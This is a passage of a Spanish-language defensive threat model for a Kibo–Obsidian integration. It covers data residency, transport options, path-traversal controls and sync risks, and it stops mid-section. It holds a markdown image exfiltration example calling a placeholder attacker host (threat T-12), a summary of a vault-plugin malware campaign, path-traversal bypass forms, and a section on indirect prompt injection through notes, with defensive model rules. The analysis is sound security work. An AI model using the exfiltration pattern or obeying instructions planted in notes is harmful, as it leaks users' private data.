# 05 · Seguridad y privacidad — Integración Kibo ↔ Obsidian

**Fecha:** 2026-08-08 · **Autor:** `security-auditor` · **Estado:** análisis para ADR · **Tipo:** revisión defensiva, read-only
**Insumos:** `docs/analysis/obsidian/00-brief.md`, `docs/product/PRD-kibo.md` (v1.0, §3.10, §3.11, §3.12, §4, §5), `constitution.md` (Art. 1, 2, 3, 9, 11)
**Alcance:** superficie de seguridad y privacidad de la integración. **Fuera de alcance:** mercado, fases de producto, UI.

**Convención de evidencia.** Cada afirmación externa lleva marca:
`[V]` **hecho verificado** con fuente y fecha · `[S]` **supuesto** de ingeniería (razonamiento propio, no verificado con fuente) · `[P]` **pendiente de verificar** antes de decidir.

---

## 0 · Resumen ejecutivo

La integración propuesta en el PRD §4 combina, en un solo producto, los cuatro ingredientes que históricamente producen los peores incidentes de un producto de consumo:

1. Una **aplicación web en la nube con permiso de escritura sobre una carpeta local** del usuario.
2. Un **almacén de datos de categoría especial** en el mismo producto (Salud §3.11, Finanzas §3.10, Diario §3.11).
3. Un **canal de IA** que recibe contenido escrito por terceros (las notas) como entrada.
4. Un **motor de sincronización bidireccional** sobre archivos que el usuario considera irremplazables.

Ninguno de los cuatro es descartable por sí solo. La combinación sí exige que el ADR fije restricciones duras antes de escribir la primera línea de código, porque casi todas son decisiones de arquitectura que no se pueden "parchear después".

**Veredicto de seguridad:** la integración **puede existir**, pero solo bajo una postura de **plugin propio como único canal soportado, con la nube sin autoridad sobre el disco, alcance de carpeta única, IA sin poder de escritura ni de economía, y prohibición absoluta de que datos de salud y finanzas toquen el vault o el proveedor de LLM**. La ruta "Kibo web habla directo con el Local REST API" y la ruta "agente local propio" deben descartarse para v1.

### Hallazgos de mayor severidad

| # | Hallazgo | Severidad | Sección |
|---|---|---|---|
| H-1 | La nube con permiso de escritura arbitraria sobre el vault permite escribir en `.obsidian/plugins/**`, que es un canal de ejecución de código en la máquina del usuario — el patrón exacto de la campaña PHANTOMPULSE | **Crítico** | §2.4, §3 |
| H-2 | El PRD §4 propone "última escritura gana + respaldo" como resolución de conflictos sobre un vault que contiene el diario personal. Es insuficiente: garantiza pérdida silenciosa de contenido | **Crítico** | §2.6 |
| H-3 | Sin identificador estable (el PRD prohíbe frontmatter), un renombrado se ve como *delete + create*; un sync mal reconciliado borra archivos | **Crítico** | §2.6 |
| H-4 | Si la capa de IA otorga XP, crea tareas o escribe archivos, una nota puede instruirla (indirect prompt injection). El contenido de notas es entrada **no confiable** por definición | **Alto** | §2.5 |
| H-5 | El token de emparejamiento almacenado en `data.json` del plugin vive **dentro del vault** y por lo tanto se sincroniza a Obsidian Sync / iCloud / Dropbox / git — violación directa de Art. 1 | **Alto** | §2.3 |
| H-6 | El índice de rutas y nombres de archivo en la nube es dato personal sensible por sí mismo (`Diagnóstico depresión 2025.md`) y suele tratarse como metadato inocuo | **Alto** | §1.4 |
| H-7 | Un XSS en el origen de Kibo, con un handle persistente de File System Access API, se convierte en lectura y borrado del vault completo | **Alto** | §2.2 |
| H-8 | Diario, Salud y Finanzas enviados a un proveedor de LLM sin base legal separada ni acuerdo de retención — GDPR Art. 9 y LFPDPPP (datos sensibles y patrimoniales) | **Alto (legal)** | §4 |

### Higiene de secretos del repo (verificación puntual, 2026-08-08)

Revisión rápida del repositorio local `Proyectos/Personal/Kibo/`: **no se encontró ningún archivo `.env*` ni credencial versionada**. `.gitignore` raíz cubre `.env*`; `apps/web/.gitignore` (default de Next.js) también. Estado: **limpio**. La única deuda futura es la que introduce esta integración (§2.3, KS-11).

---

## 1 · Inventario y clasificación de datos

### 1.1 Escala de clasificación

| Nivel | Nombre | Definición operativa |
|---|---|---|
| **C4** | Crítico / categoría especial | Salud, datos patrimoniales, contenido íntimo. Régimen legal reforzado. Un incidente aquí es existencial para el producto. |
| **C3** | Confidencial personal | Contenido escrito por el usuario, con expectativa fuerte de privacidad. |
| **C2** | Interno | Metadatos operativos que revelan comportamiento pero no contenido. |
| **C1** | Secretos técnicos | Tokens, llaves, certificados. No son "datos del usuario" pero su fuga los compromete todos. |
| **C0** | Público / no sensible | Configuración sin significado personal. |

### 1.2 Matriz de residencia (la tabla que el ADR debe adoptar literalmente)

Leyenda: ✅ permitido · ⚠️ permitido solo bajo condiciones explícitas · ⛔ **prohibido por diseño (hard constraint)**

| Categoría de dato | Origen (módulo) | Clase | Dispositivo del usuario / vault | Servidor de Kibo | Proveedor de LLM |
|---|---|---|---|---|---|
| **Expediente de salud, signos, entrenos** | §3.11 Salud | **C4** | ⛔ | ✅ (cifrado en reposo, columna-nivel) | ⛔ **nunca** |
| **Cuentas, deudas, créditos, portafolio, estados de cuenta** | §3.10 Finanzas | **C4** | ⛔ | ✅ (cifrado en reposo) | ⛔ **nunca** |
| **Diario: entradas, mood, gratitud** | §3.11 Diario | **C4** | ⚠️ solo si el usuario activa el espejo de Diario, opt-in explícito y separado | ✅ | ⛔ por defecto; ⚠️ solo con consentimiento granular, revocable, específico para IA |
| **Contenido de notas de Recursos** | §3.12 Recursos | **C3** | ✅ (es su lugar natural) | ⚠️ solo lo que el usuario sincronice; minimizar | ⚠️ opt-in granular, por operación, con opción de excluir carpetas |
| **Notas de lectura, citas, dictados** | §3.11 Lectura | **C3** | ✅ | ✅ | ⚠️ opt-in |
| **Títulos, rutas, nombres de archivo, estructura de carpetas** | Integración | **C3** (no C2 — ver §1.4) | ✅ | ⚠️ cifrado en reposo; nunca en logs ni telemetría | ⛔ salvo el archivo concreto que el usuario mandó procesar |
| **Hashes de contenido, tamaños, mtime, versiones** | Integración | **C2** | ✅ | ✅ | ⛔ |
| **XP, monedas, gemas, HP, rachas, logros** | Economía §2 | **C2** | ⛔ dentro de los `.md` del usuario (§6, D-13) | ✅ | ⚠️ solo como contexto agregado, nunca como capacidad de mutación |
| **Tokens de pairing, refresh tokens, API keys** | Integración | **C1** | ⚠️ nunca en texto plano dentro del vault (§2.3) | ✅ solo hash/referencia; jamás el secreto en claro en logs | ⛔ |
| **Llave privada del certificado local (si aplicara)** | Local REST API | **C1** | Existe fuera de nuestro control | ⛔ | ⛔ |
| **Telemetría de uso de la integración** | Integración | **C2** | — | ✅ solo contadores y códigos de error | ⛔ |

### 1.3 Las cuatro reglas de residencia innegociables

1. **Salud y Finanzas nunca se escriben en el vault.** El vault es una carpeta de texto plano que el usuario puede estar sincronizando con Dropbox, iCloud, Google Drive o un repo git — servicios que Kibo no controla y que en su mayoría **no son E2EE**. Escribir un expediente médico ahí equivale a publicarlo en la nube de un tercero sin base legal. (Obsidian Sync sí es E2EE `[V]` — ver §1.5 — pero el usuario puede no usarlo.)
2. **Salud y Finanzas nunca se envían al proveedor de LLM.** Ni siquiera "resumidas". Art. 3 de la constitución del workspace lo prohíbe explícitamente y GDPR Art. 9 lo condiciona a consentimiento explícito que un producto de consumo no debería intentar recolectar para esto.
3. **El contenido del Diario sale del dispositivo solo con consentimiento separado del de "conectar Obsidian".** Conectar una bóveda y autorizar procesamiento por IA son dos decisiones distintas y deben pedirse por separado (§4.3).
4. **Ningún log, ninguna traza de error y ninguna métrica contiene nombres de archivo ni fragmentos de nota.** Solo IDs opacos y códigos de error.

### 1.4 Por qué los metadatos de archivo son C3 y no C2 (hallazgo H-6)

Es el error de clasificación más común en productos de sync. Un índice de rutas parece un dato técnico, pero:

- `Terapia/2026-03 recaída.md` es dato de salud.
- `Divorcio/borrador demanda.md` es dato judicial.
- `Finanzas/deuda tarjeta Banamex.md` es dato patrimonial.

Un índice de rutas del vault es, literalmente, **el índice de la vida del usuario**. Debe tratarse con el mismo cuidado que el contenido: cifrado en reposo, fuera de logs, fuera de backups no cifrados, fuera de cualquier volcado de soporte. `[S]` Como endurecimiento posterior, el índice puede almacenarse con rutas cifradas del lado cliente (E2EE index), lo que degrada búsqueda server-side pero elimina la clase entera de riesgo.

### 1.5 Contexto de terceros que ya toca esos datos

`[V]` **Obsidian Sync es end-to-end encrypted** con AES-256-GCM; la contraseña de cifrado es distinta de la de la cuenta y el personal de Obsidian no puede descifrar las notas; si se pierde la contraseña, los datos no son recuperables. (Fuente: documentación de seguridad de Obsidian Sync y blog de verificación de Obsidian, consultado 2026-08-08.)

Implicación: **si el usuario usa Obsidian Sync, el eslabón débil de confidencialidad pasa a ser Kibo, no Obsidian.** Es decir: al conectar Kibo, el usuario degrada su postura de privacidad de "cero conocimiento" a "confianza en Kibo". Esa degradación debe declararse en la UI de consentimiento. Es un requisito de transparencia, no un detalle de copy.

---

## 2 · Modelo de amenazas STRIDE

### 2.0 Fronteras de confianza y actores

**Assets a proteger**, en orden: (A1) integridad y disponibilidad del vault del usuario · (A2) confidencialidad del contenido de notas y diario · (A3) confidencialidad de salud y finanzas en Kibo · (A4) integridad de la economía del juego · (A5) credenciales de pairing.

**Fronteras de confianza (TB):**
- **TB-1** Navegador ↔ sistema de archivos local (File System Access API).
- **TB-2** Origen web público ↔ servidor HTTP en loopback (Local REST API).
- **TB-3** Plugin en Obsidian ↔ API de Kibo en la nube (salida TLS).
- **TB-4** Servidor de Kibo ↔ proveedor de LLM.
- **TB-5** Contenido de nota (escrito por cualquiera, incluso un tercero que compartió un vault) ↔ el motor de reglas y la IA de Kibo. **Esta es la frontera que el PRD no reconoce y la que más preocupa.**

**Actores hostiles considerados:** sitio web malicioso que el usuario visita en otra pestaña · atacante en la misma red (café, coworking, oficina) · autor de un plugin de Obsidian de terceros · atacante que envía al usuario una nota o un vault compartido · atacante que compromete una dependencia de nuestro plugin · empleado o proceso interno de Kibo con acceso a la base · el propio proveedor de LLM como sub-encargado.

**Fuera de modelo (declarado):** atacante con acceso físico persistente al dispositivo desbloqueado; malware con privilegios de administrador ya instalado. En esos escenarios el vault ya está perdido; el objetivo del diseño es **no aumentar el radio de explosión** de esos compromisos.

### 2.1 Tabla STRIDE consolidada

Severidad = f(impacto, probabilidad). Los controles se detallan en §5.

| ID | STRIDE | Frontera | Amenaza | Impacto | Prob. | **Severidad** | Control |
|---|---|---|---|---|---|---|---|
| T-01 | Spoofing | TB-2 | Sitio malicioso en otra pestaña suplanta a Kibo y consulta el Local REST API local | Lectura completa del vault | Baja | **Alto** | KS-16, LNA de Chrome |
| T-02 | Spoofing | TB-3 | Servidor falso suplanta la API de Kibo ante el plugin (DNS, proxy corporativo, MITM) | Robo de token, inyección de comandos de escritura | Baja | **Alto** | KS-10, validación TLS estricta, pinning |
| T-03 | Tampering | TB-3 | Path traversal: la nube dicta una ruta que escapa del root | Escritura arbitraria en el disco | Media | **Crítico** | KS-01, KS-03 |
| T-04 | Tampering | TB-3 | Escritura en `.obsidian/plugins/**` o `.obsidian/**` | **Ejecución de código** en la máquina del usuario | Media | **Crítico** | KS-02 |
| T-05 | Tampering | TB-5 | Indirect prompt injection desde el contenido de una nota | XP/monedas falsas, tareas fantasma, escritura de archivos dirigida por atacante | **Alta** | **Alto** | KS-07, KS-08, KS-20 |
| T-06 | Tampering | TB-3 | Bug de sync sobrescribe, trunca o borra notas | Pérdida irreversible del diario; evento de reputación terminal | Media | **Crítico** | KS-04, KS-05, KS-13 |
| T-07 | Repudiation | TB-3 | Sin bitácora de operaciones, ni el usuario ni Kibo pueden reconstruir qué se borró y cuándo | Imposibilidad de responder un incidente o una queja | Alta | **Medio-Alto** | KS-19 |
| T-08 | Info disclosure | TB-3 | Token de pairing en `data.json` dentro del vault → se sincroniza a nube de terceros o a un repo git público | Acceso persistente de terceros a la cuenta y al vault | **Alta** | **Alto** | KS-11 |
| T-09 | Info disclosure | TB-1 | XSS o script de terceros en el origen de Kibo con handle FSA persistente | Lectura y borrado del vault completo desde el navegador | Media | **Alto** | KS-15 |
| T-10 | Info disclosure | TB-4 / interno | Índice de rutas y nombres en la nube o en logs | Revelación de salud, finanzas, vida privada sin abrir un solo archivo | Alta | **Alto** | KS-12, KS-06 |
| T-11 | Info disclosure | TB-4 | Contenido de diario procesado por LLM sin base legal, sin DPA, con retención larga | Sanción regulatoria + daño reputacional | Media | **Alto** | KS-09, KS-17 |
| T-12 | Info disclosure | TB-5 | Exfiltración por markdown: `![](https://atacante/?d=<datos>)` renderizado en la salida de IA o escrito en una nota | Fuga silenciosa de contenido a un dominio del atacante | Media | **Alto** | KS-08, CSP `img-src` |
| T-13 | Info disclosure | TB-2 | Listener HTTP en claro (27123) o `bindingHost` en `0.0.0.0` en red compartida | Token bearer y notas en texto claro en la LAN | Media si se soporta esta ruta | **Alto** | KS-16 (o descartar la ruta) |
| T-14 | DoS | TB-3 | Bucle de sync, tormenta de escrituras, llenado de disco | Dispositivo inutilizable, cuota de API agotada | Media | **Medio** | KS-13 |
| T-15 | DoS | TB-3 | Archivos corruptos o bloqueos de escritura dejan el vault inusable en Obsidian | Pérdida de acceso al conocimiento del usuario | Baja-Media | **Medio** | KS-04 (escritura atómica) |
| T-16 | Elevation | TB-3 | Token sin scope, de larga vida y no revocable | Un token filtrado = control total del vault, para siempre | Media | **Alto** | KS-10, KS-01 |
| T-17 | Elevation | Cadena de suministro | Dependencia o release de *nuestro* plugin comprometido | Ejecución con todos los privilegios del usuario, en todos los usuarios | Baja | **Crítico** | KS-14 |
| T-18 | Elevation | TB-2 | Certificado auto-firmado que instruimos al usuario a confiar a nivel de sistema | Habilita MITM local por cualquier proceso que lea la llave | Baja | **Medio-Alto** | Descartar la ruta (§6, D-4) |
| T-19 | Spoofing/Elev. | Dispositivo | Dispositivo comprometido: cualquier proceso local lee `data.json` | Suplantación del usuario ante Kibo | Media | **Alto** | KS-10 (TTL corto, binding, revocación) |
| T-20 | Info disclosure | Plugin | Telemetría con nombres de archivo o contenido | Violación de las Developer policies de Obsidian + privacidad | Media | **Alto** (bloqueante de publicación) | KS-06, §3.2 |

### 2.2 Transporte local — opción A: File System Access API

**Hechos verificados** (Chrome for Developers y especificación WICG, consultados 2026-08-08):

- `[V]` Soportada en Chromium (Chrome, Edge, Opera). **No en Firefox ni en Safari**; `showDirectoryPicker()` no existe en Safari (macOS/iOS/iPadOS) ni en navegadores móviles. Mozilla publicó una posición estándar negativa sobre los métodos de selección de disco local.
- `[V]` Requiere contexto seguro (HTTPS o localhost).
- `[V]` **Nunca expone rutas absolutas** a la web; entrega *handles* de capacidad otorgados por el usuario mediante el selector nativo del SO.
- `[V]` El navegador mantiene un **blocklist**: raíz del SO, directorio de Windows, `Library` de macOS, raíz del home del usuario y otras carpetas de sistema quedan fuera.
- `[V]` Desde **Chrome 122** existen *persistent permissions*: la opción "Allow on every visit" concede acceso indefinido hasta que el usuario lo revoque en la configuración del sitio. Sin ella, el permiso es *origin-bound* y se revoca al cerrar todas las pestañas del origen.
- `[V]` Los handles son serializables con *structured clone* y **persistibles en IndexedDB**, de modo que la app los recupera en sesiones posteriores.

**Análisis de riesgo.**

La propiedad valiosa de esta API es que el permiso es **mediado por el usuario, sin rutas y con blocklist del SO**: elimina de raíz la clase "la app elige a qué carpeta acceder". Su propiedad peligrosa es que el permiso es **de carpeta completa, lectura y escritura, y lo hereda todo el JavaScript del origen**.

`[S]` De ahí el hallazgo H-7: en una app web normal, un XSS roba una sesión. En una app web con un handle FSA persistente sobre el vault, **un XSS borra el diario del usuario**. Lo mismo aplica a cualquier script de terceros cargado en ese origen: analítica, chat de soporte, píxel de marketing, un tag manager. Cada uno de ellos hereda, en la práctica, permiso de escritura sobre la carpeta personal del usuario.

Segundo problema: `[S]` Kibo es web, así que la sincronización solo corre **mientras la pestaña está abierta**. No hay sync de fondo, no hay reconciliación al despertar el equipo, no hay recuperación tras cerrar el navegador a media escritura. Como motor de espejo bidireccional (F2 del PRD), es estructuralmente frágil.

Tercer problema: `[V]` la exclusión de Safari, Firefox y todo móvil hace que esta ruta **no pueda ser el canal principal de un producto multiusuario**, que es el encuadre vinculante del brief §1.

**Veredicto FSA:** ✅ **apta** para import/export puntual y con permiso transitorio (F0). ⛔ **no apta** como motor de sync persistente, salvo con aislamiento de origen y CSP estricta (KS-15), y aun así con las limitaciones de cobertura y de ejecución en primer plano.

### 2.3 Transporte local — opción B: plugin comunitario *Local REST API*

**Hechos verificados** (repositorio `coddingtonbear/obsidian-local-rest-api` y su documentación, consultados 2026-08-08):

- `[V]` Levanta **dos servidores locales**: HTTPS en el puerto **27124** por defecto y un HTTP **inseguro opcional** en **27123**. Puertos configurables.
- `[V]` Autenticación **Bearer token**: API key de 64 caracteres hexadecimales generada con bytes aleatorios criptográficos en el primer arranque; obligatoria en todos los endpoints salvo `GET /`; comparación de token en **tiempo constante** (defensa contra timing attacks).
- `[V]` Certificado **auto-firmado** RSA 2048 / SHA-256, descargable desde `https://127.0.0.1:27124/obsidian-local-rest-api.crt`, con SAN que incluye `127.0.0.1` y los `bindingHost`/`subjectAltNames` configurados.
- `[V]` El ajuste **`bindingHost`** cambia la interfaz de escucha; ponerlo en `0.0.0.0` **expone la bóveda a otros dispositivos de la red**. Por defecto toda la comunicación permanece en la máquina.
- `[V]` La versión actual también expone un **servidor MCP** en `https://127.0.0.1:27124/mcp/` con el mismo bearer token.

**Hecho verificado que cambia todo el análisis:**

- `[V]` **Chrome 142 (lanzado el 28 de octubre de 2025) introdujo el permiso *Local Network Access* (LNA)**, que bloquea las peticiones de un sitio web público hacia direcciones de red privada, loopback (`127.0.0.1`, `localhost`) y dominios `.local`, detrás de un prompt de permiso explícito. Sustituye al esfuerzo previo *Private Network Access*, que quedó en pausa. Si el usuario deniega el prompt — o no lo entiende — la petición falla silenciosamente. (Fuente: blog de Chrome for Developers sobre Local Network Access, consultado 2026-08-08.)

**Análisis de riesgo.**

El diseño criptográfico del plugin es **mejor de lo típico** en su categoría: token largo de origen CSPRNG, comparación en tiempo constante, TLS por defecto y loopback por defecto. Eso hay que reconocerlo. El problema no es la calidad del plugin; es que **el modelo de "app web pública hablando con un servidor local" es inadecuado para el caso de uso de Kibo**:

1. **Custodia del token (crítico).** Para que Kibo web hable con `127.0.0.1:27124` necesita **la API key maestra del vault dentro del navegador**. Donde sea que se guarde (`localStorage`, IndexedDB, memoria), un XSS o un script de terceros la extrae. Ese token no tiene scope: `[S]` no está documentado un mecanismo de tokens por-aplicación ni por-carpeta, así que es todo-o-nada sobre la bóveda entera, y rotarlo significa regenerarlo y romper todas las demás integraciones del usuario. Es exactamente lo contrario del principio de mínimo privilegio (Art. 9).
2. **Certificado auto-firmado (T-18).** El navegador rechazará `https://127.0.0.1:27124` por defecto. La única forma de que Kibo web funcione es **instruir al usuario a instalar y confiar un certificado local**. Esto es un anti-patrón: entrena al usuario a hacer precisamente lo que los atacantes le piden, y deja una llave privada en disco legible por procesos locales.
3. **LNA (T-01, disponibilidad).** `[V]` Desde Chrome 142 cada intento de Kibo de tocar loopback dispara un prompt de permiso. Es bueno para la seguridad (mitiga T-01: otro sitio malicioso ya no puede sondear el puerto sin fricción) y **malo para la viabilidad**: la feature premium depende de un prompt que el usuario puede negar y de un comportamiento que varía por navegador y versión.
4. **Exposición en red compartida (T-13).** `[V]` `bindingHost = 0.0.0.0` más el listener HTTP en claro publican la bóveda y el bearer token en la LAN. En un coworking o una oficina, eso es exposición real. Ningún flujo de Kibo debe pedir, sugerir ni documentar esa configuración.
5. **Dependencia de terceros no controlada.** Una feature premium de Kibo dependería de un plugin comunitario cuyo mantenimiento, disponibilidad y superficie (ahora también MCP) Kibo no gobierna. Es riesgo de cadena de suministro y de continuidad de producto a la vez.
6. `[P]` **Pendiente de verificar antes de cualquier soporte:** si el plugin valida la cabecera `Host` (defensa contra DNS rebinding) y qué política CORS aplica a orígenes web. No he auditado su código y **no afirmo que exista una vulnerabilidad**; señalo el control que habría que confirmar. Si Kibo llegara a soportar esta ruta, esta verificación es previa y bloqueante.

**Veredicto Local REST API:** ⛔ **no apto como canal soportado** de un producto de consumo multiusuario. `[S]` A lo sumo puede tolerarse como modo "avanzado, no soportado, bajo tu propio riesgo" documentado, sin que ninguna feature de pago dependa de él, y sin que Kibo distribuya jamás instrucciones para instalar certificados o cambiar `bindingHost`.

### 2.4 Transporte local — opciones C y D: plugin propio y agente local

**Opción C — plugin propio "Kibo para Obsidian" (recomendada).**

Ventajas de seguridad, todas estructurales:

- **No abre ningún puerto.** Toda la comunicación es **saliente** desde el plugin hacia la API de Kibo. Elimina de raíz T-01, T-13, T-18 y la mayor parte de T-02 (con validación TLS estándar).
- **La nube deja de dictar rutas.** El plugin usa la API de vault de Obsidian, que ya opera en rutas relativas dentro de la bóveda, y aplica encima nuestra propia validación (KS-03). Es el único diseño en el que **la autoridad sobre el disco vive en el dispositivo**, que es lo correcto.
- **Permite scope real:** el plugin puede limitarse a una subcarpeta declarada (p. ej. `Kibo/`) sin depender de que la nube "se porte bien".
- **Es auditable públicamente**, lo que convierte la confianza en algo verificable (§3).

Riesgo propio que introduce, y que hay que asumir con los ojos abiertos:

- **H-5 / T-08 — el token dentro del vault.** `[S]` La ruta natural de persistencia de un plugin de Obsidian es `data.json` bajo `.obsidian/plugins/<id>/`, es decir, **dentro de la carpeta que el usuario sincroniza**. Si el usuario usa Obsidian Sync con "sync de configuración" activo, iCloud/Dropbox sobre la carpeta, o versiona su vault en git (práctica común), **el token viaja**. Ya ha habido casos públicos de secretos en repos de vaults. Contramedidas, en orden de preferencia: (a) `[P]` verificar si la API de Obsidian expone `safeStorage` de Electron o equivalente para cifrar con la llave del SO; (b) si no, **asumir que el token es visible en disco** y compensar con TTL corto, refresh rotativo con detección de reuso, binding a dispositivo y revocación inmediata (KS-10); (c) documentar en el README que el archivo de datos del plugin no debe sincronizarse ni versionarse.
- **T-17 — cadena de suministro.** Nuestro plugin corre sin sandbox (§3.1). Un release comprometido es RCE en todos los usuarios. Se mitiga con KS-14, no con buenas intenciones.

**Opción D — agente local propio (daemon).**

`[S]` Es la opción con más capacidad y, con diferencia, la de mayor responsabilidad: implica distribuir un ejecutable, firmarlo (Authenticode en Windows, notarización en macOS), operar un canal de auto-actualización — que es, por definición, un canal de ejecución remota de código en las máquinas de los usuarios — y custodiar las llaves de firma. Para un equipo pequeño, el costo de operación segura de ese canal supera el beneficio frente al plugin. **Descartar en v1** (§6, D-11).

### 2.5 Path traversal y escritura arbitraria (T-03, T-04)

Este es el vector que convierte "una feature de notas" en "un problema de seguridad del sistema operativo del usuario". La regla de arquitectura de la que se derivan todos los controles:

> **La nube nunca envía rutas de sistema de archivos. La nube envía intenciones sobre identificadores lógicos; el componente local resuelve, valida y ejecuta.**

Controles de contención, en orden de aplicación:

1. **Un único root configurado y una subcarpeta por defecto.** `[S]` v1 escribe exclusivamente dentro de una carpeta declarada por el usuario (por defecto `Kibo/`). Fuera de ese root no existe operación de escritura posible, ni siquiera "para una excepción".
2. **Canonicalización obligatoria antes de tocar disco.** Resolver a ruta absoluta real (siguiendo enlaces) y **rechazar si no empieza por `root + separador`**. Con validaciones específicas de plataforma que suelen olvidarse en Windows, que es el entorno de Sergio:
   - segmentos `..` y `.` en cualquier forma, incluyendo codificaciones URL y Unicode;
   - rutas absolutas y **rutas relativas a unidad** (`C:archivo`);
   - **UNC y rutas extendidas** (`\\servidor\recurso`, `\\?\`, `\\.\`);
   - **enlaces simbólicos, junctions y hardlinks** — resolver el destino y volver a validar contra el root; un symlink dentro del root apuntando a `%APPDATA%` es el bypass clásico;
   - **NTFS Alternate Data Streams** (`nota.md:oculto`);
   - **nombres de dispositivo reservados** (`CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`, `LPT1`–`LPT9`);
   - puntos y espacios finales (`archivo.md.` normaliza a `archivo.md`);
   - byte nulo y caracteres de control;
   - normalización Unicode a NFC y rechazo de **anulaciones de dirección de texto** (`U+202E` y familia), que permiten que `nota\u202Egnp.js` se muestre como `notasj.png`.
3. **Allowlist de extensiones.** v1 escribe únicamente `.md`. Nada de `.js`, `.json`, `.mjs`, `.sh`, `.ps1`, `.bat`, `.lnk`, `.dll`, `.exe`.
4. **Denylist absoluta de `.obsidian/**` (control más importante de toda la integración).** `[V]` La campaña **REF6598 / PHANTOMPULSE**, documentada por **Elastic Security Labs en abril de 2026**, demuestra por qué: los atacantes preparaban un vault compartido malicioso, pedían a la víctima habilitar la sincronización de plugins comunitarios, y el plugin **Shell Commands** ejecutaba automáticamente PowerShell o shell **al abrir la bóveda, sin más interacción**, entregando un RAT multiplataforma (Windows y macOS) con resolución de C2 vía blockchain. (Fuentes: Elastic Security Labs, "Phantom in the vault"; The Hacker News, abril 2026; nota de investigación de Cloud Security Alliance, 2026-04-16.)
   La lección directa para Kibo: **cualquier ruta de escritura de Kibo que alcance `.obsidian/` es un canal de ejecución de código.** No basta con "no lo vamos a usar": debe ser imposible por construcción, validado en el componente local, con test de regresión dedicado.
5. **Sin borrado desde la nube en v1.** La única operación destructiva permitida es **mover a papelera** dentro del vault (`Kibo/.papelera/`), reversible por el usuario. `unlink` no existe en el código v1.
6. **Escritura atómica.** Escribir a un temporal en el mismo directorio, `fsync`, y `rename` sobre el destino. Nunca truncar en sitio: un corte de energía a media escritura no debe dejar una nota vacía.
7. **Cuotas y disyuntor.** Tamaño máximo por archivo, número máximo de operaciones por lote, límite de tasa, y un **circuit breaker** que detiene la sincronización y pide confirmación humana si en una ventana se superan N operaciones destructivas o de sobrescritura.
8. **Vista previa en la primera sincronización.** *Dry-run* con diff antes de la primera escritura real. Es control de seguridad y de confianza a la vez.

### 2.6 Contenido de notas como entrada no confiable al LLM (T-05, T-12)

**Marco.** `[V]` En el **OWASP Top 10 for LLM Applications 2025**, *Prompt Injection* (LLM01) conserva el primer puesto por segunda edición consecutiva, y se distingue explícitamente la **inyección indirecta**: instrucciones incrustadas en documentos, páginas u otro contenido que el modelo procesa después, y que el modelo puede seguir como si fueran legítimas. Las mitigaciones recomendadas son **defensa en profundidad**: herramientas con mínimo privilegio, filtrado de entrada y salida, **aprobación humana para acciones de alto riesgo**, segregación del contenido externo para que los datos no confiables no puedan influir en las instrucciones, y pruebas adversariales periódicas. (Fuente: OWASP Top 10 for LLM Applications v2025, consultado 2026-08-08.)

**Por qué Kibo es un caso especialmente expuesto.** En la mayoría de las apps, una inyección exitosa produce texto raro. En Kibo produce **dinero**. Existe una economía interna (monedas K, gemas, XP, HP, cofres, §2 del PRD) y una capa de IA comercial (*Inteligencia*, §3.13). Si la IA otorga XP o crea tareas, **existe un incentivo económico directo para inyectar prompts**, y no solo por parte de un atacante externo: también del propio usuario, que puede "farmear" su economía escribiendo instrucciones en sus notas. Cualquier diseño que ignore esto degrada además la integridad del juego, que es la propuesta de valor entera.

**Diseño de contención (jerárquico, del control más fuerte al más débil):**

1. **La IA no es autoridad. Nunca.** *(KS-07 — bloqueante)*
   XP, monedas, gemas, HP, rachas y logros se otorgan **exclusivamente** por reglas deterministas del servidor, disparadas por eventos verificados del usuario (guardó una nota, completó una tarea). El hecho de que exista una nota es un evento verificable; **la opinión del modelo sobre esa nota nunca acuña moneda.** Este único control anula la mayor parte del impacto de T-05.
2. **La IA no escribe archivos.** *(KS-07 — bloqueante)* El servicio de IA no posee credencial de escritura al vault. Si una función de IA debe producir una nota, emite una **propuesta**, no una escritura.
3. **Segregación de canales.** *(KS-08 — bloqueante)* El contenido de la nota jamás se concatena en la instrucción de sistema. Va en un campo estructurado y delimitado, marcado explícitamente como datos no confiables, con instrucción de sistema que declara que ese bloque **nunca contiene instrucciones**. Es mitigación parcial y conocida como insuficiente por sí sola — de ahí que sea el control #3 y no el #1.
4. **Salidas tipadas + validación de negocio + confirmación humana.** *(KS-08 — bloqueante)* La IA devuelve una estructura validada contra esquema (nada de texto libre interpretado como comando). El servidor valida contra reglas de negocio, y **toda acción que escriba en el vault o mueva economía requiere confirmación explícita del usuario**, alineado con la recomendación de human-in-the-loop de OWASP.
5. **Manejo seguro de la salida.** *(KS-08 — bloqueante)* La salida del modelo se renderiza como texto, nunca como HTML o markdown con contenido activo. Se eliminan `javascript:`, `data:`, `obsidian://` y esquemas no reconocidos. **CSP con `img-src` restringido a orígenes propios**, para cerrar T-12: el canal de exfiltración clásico es una imagen markdown remota cuya URL contiene los datos robados.
6. **Aislamiento multiusuario.** El contenido de un usuario nunca comparte contexto, índice de recuperación ni caché con el de otro. El contenido de notas nunca se usa para entrenamiento ni fine-tuning (contractual con el proveedor, §4.4).
7. **Detección de anomalías.** *(KS-23 — endurecimiento)* Picos de XP, rachas imposibles y ráfagas de creación de tareas se marcan y se limitan por tasa.
8. **Suite adversarial en CI.** *(KS-20)* Un corpus de notas con inyecciones conocidas (instrucciones directas, texto oculto, contenido en frontmatter, HTML embebido, homoglifos, cambio de idioma, instrucciones dentro de bloques de código) que debe pasar en cada release antes de habilitar cualquier función de IA sobre el vault. Handoff natural a `qa-engineer` + `ai-engineer`.

### 2.7 Sync como vector de pérdida y corrupción (T-06, H-2, H-3)

Este es el riesgo con mayor impacto de negocio de todo el análisis. **Un bug que borra el vault de un usuario es irreparable y públicamente terminal** para un producto que se vende sobre la promesa de cuidar la vida de la gente.

**Impugnación directa al PRD §4.** El PRD dice: *"Riesgo: conflictos de edición simultánea (se resuelve con 'última escritura gana' + respaldo, como hacen los plugins de sync)"*. Como criterio de seguridad, **esto es inadecuado** para este contenido:

- *Last-write-wins* sobre un diario personal significa **pérdida silenciosa de contenido escrito a mano**. El usuario no se entera hasta que busca la entrada y no está.
- "+ respaldo" no está especificado: ¿dónde, cuánto tiempo, quién lo restaura, se prueba la restauración? Un respaldo no verificado no es un control.

**Impugnación al "sin frontmatter" (H-3).** El PRD promete archivos limpios y prohíbe metadata gamificada en el frontmatter del usuario. La promesa de producto es correcta y además **refuerza la privacidad** (lo que Kibo escribe en el vault puede acabar en una nube de terceros, §1.3). Pero tiene una consecuencia de seguridad ineludible: **sin identificador estable en el archivo, un renombrado o un movimiento se presenta al motor como borrado + creación.** Un reconciliador ingenuo responde borrando. Resolución recomendada:

